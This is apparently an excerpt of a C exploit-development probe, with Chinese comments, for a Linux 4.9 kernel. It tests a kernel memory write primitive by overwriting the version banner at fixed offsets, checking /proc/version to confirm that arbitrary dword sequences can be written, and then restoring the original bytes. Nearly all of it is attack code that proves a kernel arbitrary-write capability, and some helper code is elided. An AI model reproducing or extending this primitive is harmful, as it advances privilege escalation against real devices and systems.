/*
 * kort_probe4.c - BIND 页细粒度写入判定 (banner 判据)
 *
 * slide=0 已确认 (probe3 B1)。本测试确定 BIND 页上:
 *   T1: H=4  (64B)  @ +0x78, val AAAA  -> version 首4字节 AAAA?
 *   T2: H=0x20 (256B) @ +0x78, val BBBB -> version 首字节 BBBB? (覆盖范围)
 *   T3: 细粒度: 先 +0x78=CCCC (H=0x20), 再 +0x7C=DDDD (H=0x20)
 *       -> version = "CCCCDDDD..."?  (升序交叠窗口 = 任意 dword 序列)
 *   T4: 恢复 banner 原始 5 dword (升序窗口)
 * 全程读 /proc/version 作判据
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
...
int main(void) {
    ...
    printf("[*] kort_probe4 - fine-grained BIND write characterization\n");
    ...
    printf("[+] BIND banner page OK\n");

    char v[160];

    /* T1: H=4 @ +0x78, AAAA */
    printf("\n[T1] H=4  @ +0x78 val=AAAA\n");
    wb_write_wh(fd, (uint32_t*)buf, VA + 0x78, 0x41414141, 0x10, 0x4);
    flush_cpu_cache();
    read_version(v, sizeof(v));
    printf("  ver: %.60s\n", v);

    /* T2: H=0x20 @ +0x78, BBBB (看覆盖长度) */
    printf("\n[T2] H=0x20 @ +0x78 val=BBBB\n");
    wb_write_wh(fd, (uint32_t*)buf, VA + 0x78, 0x42424242, 0x10, 0x20);
    flush_cpu_cache();
    read_version(v, sizeof(v));
    printf("  ver: %.90s\n", v);

    /* T3: 细粒度: +0x78=CCCC 然后 +0x7C=DDDD (升序) */
    printf("\n[T3] fine-grain: +0x78=CCCC then +0x7C=DDDD (both H=0x20)\n");
    wb_write_wh(fd, (uint32_t*)buf, VA + 0x78, 0x43434343, 0x10, 0x20);
    wb_write_wh(fd, (uint32_t*)buf, VA + 0x7C, 0x44444444, 0x10, 0x20);
    flush_cpu_cache();
    read_version(v, sizeof(v));
    printf("  ver: %.60s\n", v);
    if (strncmp(v, "CCCCDDDD", 8) == 0)
        printf("  [+] *** FINE-GRAINED WORKS: arbitrary dword sequence possible ***\n");
    else if (strncmp(v, "DDDD", 4) == 0)
        printf("  [!] both windows landed same place (aligned down)\n");

    /* T4: 恢复 banner 前 5 dword */
    printf("\n[T4] restore banner (ascending windows)\n");
    {
        static const uint32_t dw[5] = {
            0x756e694c, 0x65762078, 0x6f697372, 0x2e34206e, 0x36322e39,
        };
        for (int i = 0; i < 5; i++)
            wb_write_wh(fd, (uint32_t*)buf, VA + 0x78 + 4*i, dw[i], 0x10, 0x20);
        flush_cpu_cache();
        read_version(v, sizeof(v));
        printf("  ver: %.60s\n", v);
    }
